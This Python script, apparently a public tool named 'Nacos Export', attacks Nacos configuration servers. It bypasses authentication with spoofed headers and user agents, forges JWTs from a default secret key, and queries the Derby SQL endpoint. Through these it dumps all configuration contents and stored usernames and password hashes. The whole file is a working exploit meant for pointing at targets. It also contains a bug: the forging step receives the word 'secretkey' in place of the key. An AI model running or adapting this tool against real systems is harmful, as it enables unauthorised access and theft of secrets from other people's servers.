import requests
import sys
import urllib3
urllib3.disable_warnings()
import time
from email.utils import parsedate
import jwt
import base64


PROXY = {
    # "http": "127.0.0.1:8080"
}
HEADER = {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
}
COUNT = 0

def login(target: str, username: str, password: str) -> str:
    token = None
    login_1 = "/v1/auth/users/login"
    login_2 = "/v1/auth/login"

    login_params = {
        'username': username,
        'password': password,
        'namespaceId': ''
    }

    try:
        resp = requests.post(target + login_1, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
        resp_json = resp.json()
        token = resp_json.get("accessToken")
        if token == None:
            resp = requests.post(target + login_2, headers=HEADER, data=login_params, proxies=PROXY, verify=False)
            token = resp.headers.get("Authorization")
    except Exception:
        pass
    if token == None:
        print("[!] login failed.")
        exit(0)
    else:
        print("[+] Tokne: {}".format(token))
        return token

def get_namespaces(target: str, token: str) -> list:
    path = "/v1/console/namespaces"
    url = target + path
    if token != "":
        HEADER["Authorization"] = token
    params = {
        'namespaceId': '',
    }
    resp = requests.get(url, headers=HEADER, params=params, proxies=PROXY, verify=False)
    if resp.status_code == 200:
        resp_dict = resp.json()
        return resp_dict['data']

def print_output(namespace: str, group:str, dataId: str, content: str):
    print("""

##################################################
[+] Namespace: {namespace}
[+] Group: {group}
[+] DataId: {dataid}
##################################################
""".format(namespace=namespace, group=group, dataid=dataId ))
    print(content, "\n")
    global COUNT
    COUNT += 1

def dump_config_content(target: str, token: str):
    namespaces = get_namespaces(target, token)
    bypass_method = 1
    for namespace in namespaces:
        if namespace["configCount"] == 0:
            namespace["configCount"] = 1 
        PARAMS = {
            "search": "accurate",
            "dataId": "",
            "group": "",
            "appName": "",
            "config_tags": "",
            "pageNo": 1,
            "pageSize": namespace["configCount"],
            "tenant": namespace["namespace"],
            "namespaceId": ""
        }
        # bypass
        if token == "":
            if bypass_method == 1:
                if not request_contents(target, HEADER, PARAMS):
                    bypass_method = 2
            if bypass_method == 2:
                HEADER['serverIdentity'] = "security"
                if not request_contents(target, HEADER, PARAMS):
                    del HEADER['serverIdentity']
                    bypass_method = 3
            if bypass_method == 3:
                HEADER['User-Agent'] = "Nacos-Server"
                if not request_contents(target, HEADER, PARAMS):
                    print("[-] Cannot bypass")
        # token
        else:
            HEADER["Accesstoken"] = token
            PARAMS["accessToken"] = token
            if not request_contents(target, HEADER, PARAMS):
                print("[-] Token Invalid.")
 
def dump_sql(target):
    # dbs_query = "select * from sys.sysschemas"
    # users_query = "select * from nacos.users"
    # content_query = "select * from nacos.config_info"

    count = 0
    path = "/v1/cs/ops/derby"
    p1 = {"sql": "select * from nacos.users"}
    resp = requests.get(target + path, headers=HEADER,  params=p1, verify=False)
    if resp.status_code == 200:
        resp_json = resp.json()
        if resp_json["code"] == 200:
            print("[+] USERS:")
            for user in resp_json["data"]:
                print("User: ", user["USERNAME"])
                print("Pass: ", user["PASSWORD"])
                print("")

    p2 = {"sql": "select * from nacos.config_info"}
    resp = requests.get(target + path, headers=HEADER, params=p2, verify=False)
    if resp.status_code == 200:
        resp_json = resp.json()
        if resp_json["code"] == 200:
            for content in resp_json["data"]:
                print_output("None", content["GROUP_ID"], content["DATA_ID"], content["CONTENT"])
                count = count + 1
    print("[+] Count: ", count)

def gen_token(target: str, secretkey: str) -> str:
    resp = requests.get(target, verify=False, proxies=PROXY)
    times = resp.headers['Date']
    times = int(time.mktime(parsedate(times)))+18000
    secret_key = base64.b64encode(secretkey.encode('utf-8')).decode('utf-8')
    payload = {
        "sub": "nacos",
        "exp": times
    }

    jwt_token = jwt.encode(payload, secret_key, algorithm='HS256')
    print("JWT TOKEN: ", jwt_token)
    return jwt_token

def request_contents(target: str, header: dict, param:dict) -> bool:
    path = "/v1/cs/configs"
    resp = requests.get(target + path, headers=header, params=param, proxies=PROXY, verify=False)
    if resp.status_code == 200:
        resp_json = resp.json()
        for item in resp_json["pageItems"]:
            print_output(param["tenant"], item["group"], item["dataId"], item["content"])
        
        return True
    else:
        return False

def usage(name: str):
    ver = "v1.3.0"
    print("""
 ______________
< Nacos Export >         @Author: Arm!tage
 --------------          @Version: {version}
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |         
                ||     ||

Usage:
    python3 {script} <URL> <USERNAME> <PASSWORD>
    python3 {script} <URL> secretkey <SECRETKEY>
    python3 {script} <URL> <TOKEN>
    python3 {script} <URL> bypass|unauth
    python3 {script} <URL> sql

Example:
    python3 {script} http://TARGET:8848/nacos nacos nacos
    python3 {script} http://TARGET:8848/nacos secretkey SecretKey012345678901234567890123456789012345678901234567890123456789
    python3 {script} http://TARGET:8848/nacos eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
    python3 {script} http://TARGET:8848/nacos unauth
    python3 {script} http://TARGET:8848/nacos sql
""".format(script=name, version=ver))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv[0])
        exit(0)

    target = sys.argv[1].rstrip('/')
    print("[+] Target:", target)
    token = ""
    if len(sys.argv) == 4:
        if sys.argv[2] == "secretkey":
            print("[+] SecertKey:", sys.argv[3])
            token = gen_token(target, sys.argv[2])
            dump_config_content(target, token)
        else:
            print("[+] Username:", sys.argv[2])
            print("[+] Password:", sys.argv[3])
            print("\n")
            token = login(target, sys.argv[2], sys.argv[3])
            dump_config_content(target, token)
    elif len(sys.argv) == 3:
        if sys.argv[2] == "bypass" or sys.argv[2] == "unauth":
            print("[*] Bypass/Unauth")
            dump_config_content(target, "")
        elif sys.argv[2] == "sql":
            dump_sql(target)
        else:
            print("[+] Token:", sys.argv[2])
            print("\n")
            token = sys.argv[2]
            dump_config_content(target, token)

    print("[+] Count: ", COUNT)